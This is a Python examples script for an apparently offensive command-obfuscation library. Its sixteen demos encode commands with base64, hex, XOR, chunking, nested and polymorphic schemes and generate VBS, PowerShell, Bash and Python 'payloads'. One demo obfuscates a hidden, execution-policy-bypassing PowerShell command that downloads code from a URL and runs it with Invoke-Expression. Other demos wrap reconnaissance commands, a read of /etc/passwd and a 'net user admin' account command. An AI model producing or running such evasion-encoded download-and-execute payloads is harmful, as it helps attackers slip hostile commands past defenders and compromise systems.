#!/usr/bin/env python3
"""
Practical examples of command string obfuscation
Real-world usage patterns and output demonstrations
"""

from command_string_obfuscator import (
    CommandStringObfuscator,
    CommandObfuscationConfig,
    EncodingMethod,
    encode_command,
    encode_to_vbs,
    encode_to_powershell,
    encode_to_bash,
)


def example_1_basic_base64_encoding():
    """Example 1: Basic base64 encoding"""
    print("\n" + "=" * 80)
    print("EXAMPLE 1: Basic Base64 Encoding")
    print("=" * 80)

    command = "echo Hello World"

    # Simple one-liner
    result = encode_command(command, EncodingMethod.BASE64)

    print(f"Original: {command}")
    print(f"Encoded:  {result['encoded_data']}")
    print(f"\nDecoder (Python):\n{result['decoder_code']}")


def example_2_hex_encoding():
    """Example 2: Hex encoding"""
    print("\n" + "=" * 80)
    print("EXAMPLE 2: Hex Encoding")
    print("=" * 80)

    command = "whoami"

    result = encode_command(command, EncodingMethod.HEX)

    print(f"Original: {command}")
    print(f"Encoded:  {result['encoded_data']}")
    print(f"\nDecoder (Python):\n{result['decoder_code']}")


def example_3_xor_encoding():
    """Example 3: XOR encoding with key derivation"""
    print("\n" + "=" * 80)
    print("EXAMPLE 3: XOR Encoding")
    print("=" * 80)

    command = "ipconfig"

    result = encode_command(command, EncodingMethod.XOR)

    print(f"Original: {command}")
    print(f"Encoded:  {result['encoded_data']}")
    print(f"XOR Key:  {result['metadata']['xor_key']}")
    print(f"\nDecoder (Python):\n{result['decoder_code']}")


def example_4_array_chunking():
    """Example 4: Array-based chunking"""
    print("\n" + "=" * 80)
    print("EXAMPLE 4: Array Chunking Encoding")
    print("=" * 80)

    command = "powershell.exe -NoProfile -WindowStyle Hidden -Command Write-Host Test"

    config = CommandObfuscationConfig(
        encoding_method=EncodingMethod.ARRAY, chunk_size=16
    )
    obfuscator = CommandStringObfuscator(config)

    result = obfuscator.obfuscate_command(command)

    print(f"Original: {command}")
    print(f"Chunks:   {result['metadata']['chunk_count']}")
    print(f"Chunk Size: {result['metadata']['chunk_size']}")
    print(f"\nFirst 3 chunks:")
    for i, chunk in enumerate(result["metadata"]["chunks"][:3]):
        print(f"  [{i}] {chunk}")
    print(f"\nDecoder (Python):\n{result['decoder_code']}")


def example_5_nested_multilayer():
    """Example 5: Nested multi-layer encoding"""
    print("\n" + "=" * 80)
    print("EXAMPLE 5: Nested Multi-Layer Encoding")
    print("=" * 80)

    command = "cmd.exe /c dir"

    result = encode_command(command, EncodingMethod.NESTED)

    print(f"Original: {command}")
    print(f"Layers:   {' -> '.join(result['metadata']['layers'])}")
    print(f"Encoded:  {result['encoded_data'][:80]}...")
    print(f"\nDecoder (Python):\n{result['decoder_code']}")


def example_6_polymorphic_encoding():
    """Example 6: Polymorphic encoding (random method each time)"""
    print("\n" + "=" * 80)
    print("EXAMPLE 6: Polymorphic Encoding")
    print("=" * 80)

    command = "systeminfo"

    print(f"Original: {command}\n")
    print("Generating 3 polymorphic encodings of the same command:\n")

    for i in range(3):
        result = encode_command(command, EncodingMethod.POLYMORPH)
        print(
            f"  [{i + 1}] Method: {result['metadata']['selected_encoder']} | "
            f"Key: {result['metadata']['polymorphic_key']} | "
            f"Length: {len(result['encoded_data'])}"
        )


def example_7_vbs_payload():
    """Example 7: Generate VBS payload"""
    print("\n" + "=" * 80)
    print("EXAMPLE 7: VBS Payload Generation")
    print("=" * 80)

    command = "powershell.exe -Command Write-Host Success"

    vbs_payload = encode_to_vbs(command)

    print(f"Command: {command}")
    print(f"\nGenerated VBS:\n")
    print(vbs_payload)


def example_8_powershell_payload():
    """Example 8: Generate PowerShell payload"""
    print("\n" + "=" * 80)
    print("EXAMPLE 8: PowerShell Payload Generation")
    print("=" * 80)

    command = "Get-Process"

    ps_payload = encode_to_powershell(command)

    print(f"Command: {command}")
    print(f"\nGenerated PowerShell:\n")
    print(ps_payload)


def example_9_bash_payload():
    """Example 9: Generate Bash payload"""
    print("\n" + "=" * 80)
    print("EXAMPLE 9: Bash Payload Generation")
    print("=" * 80)

    command = "cat /etc/passwd"

    bash_payload = encode_to_bash(command)

    print(f"Command: {command}")
    print(f"\nGenerated Bash:\n")
    print(bash_payload)


def example_10_python_standalone():
    """Example 10: Generate standalone Python payload"""
    print("\n" + "=" * 80)
    print("EXAMPLE 10: Standalone Python Payload")
    print("=" * 80)

    command = "python -c 'print(\"Hello\")"

    config = CommandObfuscationConfig(encoding_method=EncodingMethod.BASE64)
    obfuscator = CommandStringObfuscator(config)

    python_payload = obfuscator.generate_python_payload(command)

    print(f"Command: {command}")
    print(f"\nGenerated Python (standalone):\n")
    print(python_payload[:500])
    print("...")


def example_11_multi_platform():
    """Example 11: Multi-platform payloads for same command"""
    print("\n" + "=" * 80)
    print("EXAMPLE 11: Multi-Platform Generation")
    print("=" * 80)

    command = "echo Test"

    config = CommandObfuscationConfig(encoding_method=EncodingMethod.HEX)
    obfuscator = CommandStringObfuscator(config)

    print(f"Command: {command}\n")

    print("Python Decoder:")
    print("-" * 80)
    result = obfuscator.obfuscate_command(command)
    print(result["decoder_code"])

    print("\n\nVBS Payload:")
    print("-" * 80)
    print(obfuscator.generate_vbs_payload(command))

    print("\n\nPowerShell Payload:")
    print("-" * 80)
    print(obfuscator.generate_powershell_payload(command))

    print("\n\nBash Payload:")
    print("-" * 80)
    print(obfuscator.generate_bash_payload(command))


def example_12_configuration_variants():
    """Example 12: Different obfuscation configurations"""
    print("\n" + "=" * 80)
    print("EXAMPLE 12: Configuration Variants")
    print("=" * 80)

    command = "net user admin Password123"

    obfuscation_levels = [1, 2, 3, 4, 5]

    print(f"Command: {command}\n")

    for level in obfuscation_levels:
        config = CommandObfuscationConfig(
            encoding_method=EncodingMethod.BASE64, obfuscation_level=level
        )
        obfuscator = CommandStringObfuscator(config)
        result = obfuscator.obfuscate_command(command)

        print(
            f"Level {level}: {len(result['encoded_data'])} chars | "
            f"Vars: {result['metadata'].get('variable_name', 'N/A')} | "
            f"Decoder: {result['metadata'].get('decoder_name', 'N/A')}"
        )


def example_13_batch_encoding():
    """Example 13: Batch encoding multiple commands"""
    print("\n" + "=" * 80)
    print("EXAMPLE 13: Batch Command Encoding")
    print("=" * 80)

    commands = [
        "ipconfig",
        "tasklist",
        "whoami",
        "systeminfo",
        "dir C:\\",
    ]

    config = CommandObfuscationConfig(encoding_method=EncodingMethod.BASE64)
    obfuscator = CommandStringObfuscator(config)

    print("Batch encoding multiple commands:\n")

    for cmd in commands:
        result = obfuscator.obfuscate_command(cmd)
        print(
            f"  {cmd:<20} -> {result['encoded_data'][:50]}... "
            f"({len(result['encoded_data'])} bytes)"
        )

    print(f"\nTotal obfuscations tracked: {len(obfuscator._obfuscation_history)}")


def example_14_complex_powershell():
    """Example 14: Complex PowerShell command"""
    print("\n" + "=" * 80)
    print("EXAMPLE 14: Complex PowerShell Command Obfuscation")
    print("=" * 80)

    ps_command = """
powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
$web = New-Object System.Net.WebClient;
$web.Headers.Add('User-Agent', 'Mozilla/5.0');
$data = $web.DownloadString('http://example.com/payload');
Invoke-Expression $data;
"
"""

    config = CommandObfuscationConfig(encoding_method=EncodingMethod.NESTED)
    obfuscator = CommandStringObfuscator(config)

    result = obfuscator.obfuscate_command(ps_command)

    print("Original command (simplified):")
    print(ps_command[:100] + "...")
    print(f"\nEncoded (nested layers): {result['encoded_data'][:100]}...")
    print(f"\nDecoder snippet:\n{result['decoder_code'][:200]}...")


def example_15_obfuscation_report():
    """Example 15: Generate comprehensive obfuscation report"""
    print("\n" + "=" * 80)
    print("EXAMPLE 15: Comprehensive Obfuscation Report")
    print("=" * 80)

    command = "reg query HKLM\\Software\\Microsoft\\Windows"

    config = CommandObfuscationConfig(
        encoding_method=EncodingMethod.BASE64, obfuscation_level=5
    )
    obfuscator = CommandStringObfuscator(config)

    report = obfuscator.generate_full_report(command)
    print(report)


def example_16_roundtrip_verification():
    """Example 16: Encoding and decoding verification"""
    print("\n" + "=" * 80)
    print("EXAMPLE 16: Roundtrip Verification")
    print("=" * 80)

    import base64

    original = "echo This is a test command"

    config = CommandObfuscationConfig(encoding_method=EncodingMethod.BASE64)
    obfuscator = CommandStringObfuscator(config)

    result = obfuscator.obfuscate_command(original)

    print(f"Original:   {original}")
    print(f"Encoded:    {result['encoded_data']}")

    # Verify roundtrip
    decoded = base64.b64decode(result["encoded_data"]).decode()
    print(f"Decoded:    {decoded}")

    if decoded == original:
        print("\n✓ Roundtrip verification PASSED")
    else:
        print("\n✗ Roundtrip verification FAILED")


def run_all_examples():
    """Run all examples"""
    examples = [
        example_1_basic_base64_encoding,
        example_2_hex_encoding,
        example_3_xor_encoding,
        example_4_array_chunking,
        example_5_nested_multilayer,
        example_6_polymorphic_encoding,
        example_7_vbs_payload,
        example_8_powershell_payload,
        example_9_bash_payload,
        example_10_python_standalone,
        example_11_multi_platform,
        example_12_configuration_variants,
        example_13_batch_encoding,
        example_14_complex_powershell,
        example_15_obfuscation_report,
        example_16_roundtrip_verification,
    ]

    for example_func in examples:
        try:
            example_func()
        except Exception as e:
            print(f"\nError in {example_func.__name__}: {e}")

    print("\n" + "=" * 80)
    print("ALL EXAMPLES COMPLETED")
    print("=" * 80)


if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1:
        # Run specific example
        example_num = int(sys.argv[1])
        examples = [
            example_1_basic_base64_encoding,
            example_2_hex_encoding,
            example_3_xor_encoding,
            example_4_array_chunking,
            example_5_nested_multilayer,
            example_6_polymorphic_encoding,
            example_7_vbs_payload,
            example_8_powershell_payload,
            example_9_bash_payload,
            example_10_python_standalone,
            example_11_multi_platform,
            example_12_configuration_variants,
            example_13_batch_encoding,
            example_14_complex_powershell,
            example_15_obfuscation_report,
            example_16_roundtrip_verification,
        ]

        if 0 < example_num <= len(examples):
            examples[example_num - 1]()
        else:
            print(f"Example {example_num} not found (1-{len(examples)})")
    else:
        # Run all examples
        run_all_examples()
